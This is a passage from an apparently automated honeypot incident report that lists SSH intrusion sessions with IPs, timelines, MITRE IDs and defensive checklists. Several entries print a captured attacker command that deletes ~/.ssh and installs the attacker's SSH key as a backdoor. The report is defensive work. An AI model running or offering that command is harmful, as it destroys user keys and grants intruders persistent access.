- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f638f5da4b3e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 07:25 |
| **Last Seen** | 2026-07-06 07:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:25:00` | `cowrie.session.connect` |
| `2026-07-06 07:25:00` | `cowrie.client.version` |
| `2026-07-06 07:25:00` | `cowrie.client.kex` |
| `2026-07-06 07:25:00` | `cowrie.login.success` |
| `2026-07-06 07:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-472c12cd1c35

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 07:25 |
| **Last Seen** | 2026-07-06 07:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:25:00` | `cowrie.session.connect` |
| `2026-07-06 07:25:00` | `cowrie.client.version` |
| `2026-07-06 07:25:00` | `cowrie.client.kex` |
| `2026-07-06 07:25:00` | `cowrie.login.success` |
| `2026-07-06 07:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aee765e32cc1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 07:25 |
| **Last Seen** | 2026-07-06 07:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:25:09` | `cowrie.session.connect` |
| `2026-07-06 07:25:09` | `cowrie.client.version` |
| `2026-07-06 07:25:09` | `cowrie.client.kex` |
| `2026-07-06 07:25:09` | `cowrie.login.success` |
| `2026-07-06 07:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad21cdb8a16d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 07:25 |
| **Last Seen** | 2026-07-06 07:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:25:09` | `cowrie.session.connect` |
| `2026-07-06 07:25:09` | `cowrie.client.version` |
| `2026-07-06 07:25:09` | `cowrie.client.kex` |
| `2026-07-06 07:25:09` | `cowrie.login.success` |
| `2026-07-06 07:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e7680339235

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 07:25 |
| **Last Seen** | 2026-07-06 07:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:25:56` | `cowrie.session.connect` |
| `2026-07-06 07:25:56` | `cowrie.client.version` |
| `2026-07-06 07:25:57` | `cowrie.client.kex` |
| `2026-07-06 07:25:57` | `cowrie.login.success` |
| `2026-07-06 07:25:57` | `cowrie.direct-tcpip.request` |
| `2026-07-06 07:25:57` | `cowrie.direct-tcpip.data` |
| `2026-07-06 07:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bee827d78313

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 07:36 |
| **Last Seen** | 2026-07-06 07:36 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:36:31` | `cowrie.session.connect` |
| `2026-07-06 07:36:33` | `cowrie.client.version` |
| `2026-07-06 07:36:33` | `cowrie.client.kex` |
| `2026-07-06 07:36:40` | `cowrie.login.success` |
| `2026-07-06 07:36:44` | `cowrie.session.params` |
| `2026-07-06 07:36:44` | `cowrie.command.input` |
| `2026-07-06 07:36:45` | `cowrie.log.closed` |
| `2026-07-06 07:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1ad326e2383

| Field | Detail |
|---|---|
| **Source IP** | `45.94.68[.]69` |
| **First Seen** | 2026-07-06 07:37 |
| **Last Seen** | 2026-07-06 07:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:37:33` | `cowrie.session.connect` |
| `2026-07-06 07:37:33` | `cowrie.client.version` |
| `2026-07-06 07:37:34` | `cowrie.client.kex` |
| `2026-07-06 07:37:35` | `cowrie.login.success` |
| `2026-07-06 07:37:36` | `cowrie.session.params` |
| `2026-07-06 07:37:36` | `cowrie.command.input` |
| `2026-07-06 07:37:36` | `cowrie.command.failed` |
| `2026-07-06 07:37:36` | `cowrie.log.closed` |
| `2026-07-06 07:37:37` | `cowrie.session.params` |
| `2026-07-06 07:37:37` | `cowrie.command.input` |
| `2026-07-06 07:37:37` | `cowrie.session.file_download` |
| `2026-07-06 07:37:37` | `cowrie.log.closed` |
| `2026-07-06 07:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.94.68[.]69` to AbuseIPDB if not already reported
- [ ] Block `45.94.68[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62aa121f9b79

| Field | Detail |
|---|---|
| **Source IP** | `45.94.68[.]69` |
| **First Seen** | 2026-07-06 07:37 |
| **Last Seen** | 2026-07-06 07:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:37:37` | `cowrie.session.connect` |
| `2026-07-06 07:37:37` | `cowrie.client.version` |
| `2026-07-06 07:37:38` | `cowrie.client.kex` |
| `2026-07-06 07:37:39` | `cowrie.login.success` |
| `2026-07-06 07:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.94.68[.]69` to AbuseIPDB if not already reported
- [ ] Block `45.94.68[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a66bfe965149

| Field | Detail |
|---|---|
| **Source IP** | `45.94.68[.]69` |
| **First Seen** | 2026-07-06 07:37 |
| **Last Seen** | 2026-07-06 07:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:37:39` | `cowrie.session.connect` |
| `2026-07-06 07:37:39` | `cowrie.client.version` |
| `2026-07-06 07:37:39` | `cowrie.client.kex` |
| `2026-07-06 07:37:40` | `cowrie.login.success` |
| `2026-07-06 07:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.94.68[.]69` to AbuseIPDB if not already reported
- [ ] Block `45.94.68[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c3a16e71b9d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 07:43 |
| **Last Seen** | 2026-07-06 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:43:02` | `cowrie.session.connect` |
| `2026-07-06 07:43:02` | `cowrie.client.version` |
| `2026-07-06 07:43:02` | `cowrie.client.kex` |
| `2026-07-06 07:43:02` | `cowrie.login.success` |
| `2026-07-06 07:43:02` | `cowrie.direct-tcpip.request` |
| `2026-07-06 07:43:03` | `cowrie.direct-tcpip.data` |
| `2026-07-06 07:43:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21b652d05f13

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-06 07:47 |
| **Last Seen** | 2026-07-06 07:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:47:22` | `cowrie.session.connect` |
| `2026-07-06 07:47:22` | `cowrie.client.version` |
| `2026-07-06 07:47:22` | `cowrie.client.kex` |
| `2026-07-06 07:47:22` | `cowrie.login.success` |
| `2026-07-06 07:47:23` | `cowrie.session.params` |
| `2026-07-06 07:47:23` | `cowrie.command.input` |
| `2026-07-06 07:47:23` | `cowrie.log.closed` |
| `2026-07-06 07:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f29ec358431

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 07:49 |
| **Last Seen** | 2026-07-06 07:49 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:49:18` | `cowrie.session.connect` |
| `2026-07-06 07:49:21` | `cowrie.client.version` |
| `2026-07-06 07:49:21` | `cowrie.client.kex` |
| `2026-07-06 07:49:27` | `cowrie.login.success` |
| `2026-07-06 07:49:31` | `cowrie.session.params` |
| `2026-07-06 07:49:31` | `cowrie.command.input` |
| `2026-07-06 07:49:32` | `cowrie.log.closed` |
| `2026-07-06 07:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14b608253434

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 07:50 |
| **Last Seen** | 2026-07-06 07:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:50:20` | `cowrie.session.connect` |
| `2026-07-06 07:50:20` | `cowrie.client.version` |
| `2026-07-06 07:50:20` | `cowrie.client.kex` |
| `2026-07-06 07:50:21` | `cowrie.login.success` |
| `2026-07-06 07:50:21` | `cowrie.session.params` |
| `2026-07-06 07:50:21` | `cowrie.command.input` |
| `2026-07-06 07:50:21` | `cowrie.log.closed` |
| `2026-07-06 07:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac23a608c545

| Field | Detail |
|---|---|
| **Source IP** | `103.82.92[.]50` |
| **First Seen** | 2026-07-06 07:51 |
| **Last Seen** | 2026-07-06 07:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:51:28` | `cowrie.session.connect` |
| `2026-07-06 07:51:28` | `cowrie.client.version` |
| `2026-07-06 07:51:28` | `cowrie.client.kex` |
| `2026-07-06 07:51:29` | `cowrie.login.success` |
| `2026-07-06 07:51:31` | `cowrie.session.params` |
| `2026-07-06 07:51:31` | `cowrie.command.input` |
| `2026-07-06 07:51:31` | `cowrie.command.failed` |
| `2026-07-06 07:51:31` | `cowrie.log.closed` |
| `2026-07-06 07:51:32` | `cowrie.session.params` |
| `2026-07-06 07:51:32` | `cowrie.command.input` |
| `2026-07-06 07:51:32` | `cowrie.session.file_download` |
| `2026-07-06 07:51:32` | `cowrie.log.closed` |
| `2026-07-06 07:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.92[.]50` to AbuseIPDB if not already reported
- [ ] Block `103.82.92[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41b67fa74f67

| Field | Detail |
|---|---|
| **Source IP** | `103.82.92[.]50` |
| **First Seen** | 2026-07-06 07:51 |
| **Last Seen** | 2026-07-06 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:51:32` | `cowrie.session.connect` |
| `2026-07-06 07:51:33` | `cowrie.client.version` |
| `2026-07-06 07:51:33` | `cowrie.client.kex` |
| `2026-07-06 07:51:34` | `cowrie.login.success` |
| `2026-07-06 07:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.92[.]50` to AbuseIPDB if not already reported
- [ ] Block `103.82.92[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2d7d0e12992

| Field | Detail |
|---|---|
| **Source IP** | `103.82.92[.]50` |
| **First Seen** | 2026-07-06 07:51 |
| **Last Seen** | 2026-07-06 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:51:34` | `cowrie.session.connect` |
| `2026-07-06 07:51:34` | `cowrie.client.version` |
| `2026-07-06 07:51:35` | `cowrie.client.kex` |
| `2026-07-06 07:51:36` | `cowrie.login.success` |
| `2026-07-06 07:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.92[.]50` to AbuseIPDB if not already reported
- [ ] Block `103.82.92[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23541d3bedcc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-06 07:55 |
| **Last Seen** | 2026-07-06 07:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:55:11` | `cowrie.session.connect` |
| `2026-07-06 07:55:11` | `cowrie.client.version` |
| `2026-07-06 07:55:11` | `cowrie.client.kex` |
| `2026-07-06 07:55:11` | `cowrie.login.success` |
| `2026-07-06 07:55:11` | `cowrie.direct-tcpip.request` |
| `2026-07-06 07:55:11` | `cowrie.direct-tcpip.ja4` |
| `2026-07-06 07:55:11` | `cowrie.direct-tcpip.data` |
| `2026-07-06 07:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-512e8fbc7b66

| Field | Detail |
|---|---|
| **Source IP** | `57.128.225[.]99` |
| **First Seen** | 2026-07-06 07:56 |
| **Last Seen** | 2026-07-06 07:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:56:05` | `cowrie.session.connect` |
| `2026-07-06 07:56:05` | `cowrie.client.version` |
| `2026-07-06 07:56:05` | `cowrie.client.kex` |
| `2026-07-06 07:56:06` | `cowrie.login.success` |
| `2026-07-06 07:56:06` | `cowrie.session.params` |
| `2026-07-06 07:56:06` | `cowrie.command.input` |
| `2026-07-06 07:56:06` | `cowrie.command.failed` |
| `2026-07-06 07:56:07` | `cowrie.log.closed` |
| `2026-07-06 07:56:07` | `cowrie.session.params` |
| `2026-07-06 07:56:07` | `cowrie.command.input` |
| `2026-07-06 07:56:07` | `cowrie.session.file_download` |
| `2026-07-06 07:56:07` | `cowrie.log.closed` |
| `2026-07-06 07:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `57.128.225[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354a98738a57

| Field | Detail |
|---|---|
| **Source IP** | `57.128.225[.]99` |
| **First Seen** | 2026-07-06 07:56 |
| **Last Seen** | 2026-07-06 07:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:56:08` | `cowrie.session.connect` |
| `2026-07-06 07:56:08` | `cowrie.client.version` |
| `2026-07-06 07:56:08` | `cowrie.client.kex` |
| `2026-07-06 07:56:08` | `cowrie.login.success` |
| `2026-07-06 07:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `57.128.225[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd8a70adf8b2

| Field | Detail |
|---|---|
| **Source IP** | `57.128.225[.]99` |
| **First Seen** | 2026-07-06 07:56 |
| **Last Seen** | 2026-07-06 07:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:56:08` | `cowrie.session.connect` |
| `2026-07-06 07:56:08` | `cowrie.client.version` |
| `2026-07-06 07:56:08` | `cowrie.client.kex` |
| `2026-07-06 07:56:09` | `cowrie.login.success` |
| `2026-07-06 07:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `57.128.225[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8fbf26a0cd3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-06 07:56 |
| **Last Seen** | 2026-07-06 07:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:56:53` | `cowrie.session.connect` |
| `2026-07-06 07:56:53` | `cowrie.client.version` |
| `2026-07-06 07:56:54` | `cowrie.client.kex` |
| `2026-07-06 07:56:54` | `cowrie.login.success` |
| `2026-07-06 07:56:54` | `cowrie.direct-tcpip.request` |
| `2026-07-06 07:56:54` | `cowrie.direct-tcpip.ja4` |
| `2026-07-06 07:56:54` | `cowrie.direct-tcpip.data` |
| `2026-07-06 07:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da7ac54bdc8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 07:56 |
| **Last Seen** | 2026-07-06 07:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 07:56:58` | `cowrie.session.connect` |
| `2026-07-06 07:56:58` | `cowrie.client.version` |
| `2026-07-06 07:56:58` | `cowrie.client.kex` |
| `2026-07-06 07:56:58` | `cowrie.login.success` |
| `2026-07-06 07:56:58` | `cowrie.direct-tcpip.request` |
| `2026-07-06 07:56:58` | `cowrie.direct-tcpip.data` |
| `2026-07-06 07:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62cff7ef64c1

| Field | Detail |
|---|---|
| **Source IP** | `34.53.187[.]0` |
| **First Seen** | 2026-07-06 08:01 |
| **Last Seen** | 2026-07-06 08:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 08:01:18` | `cowrie.session.connect` |
| `2026-07-06 08:01:18` | `cowrie.login.success` |
| `2026-07-06 08:01:18` | `cowrie.session.params` |
| `2026-07-06 08:01:19` | `cowrie.command.input` |
| `2026-07-06 08:01:19` | `cowrie.command.input` |
| `2026-07-06 08:01:19` | `cowrie.command.failed` |
| `2026-07-06 08:01:19` | `cowrie.command.input` |
| `2026-07-06 08:01:19` | `cowrie.log.closed` |
| `2026-07-06 08:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.187[.]0` to AbuseIPDB if not already reported
- [ ] Block `34.53.187[.]0` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a82bcb751c27

| Field | Detail |
|---|---|
| **Source IP** | `189.203.163[.]10` |
| **First Seen** | 2026-07-06 08:01 |
| **Last Seen** | 2026-07-06 08:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
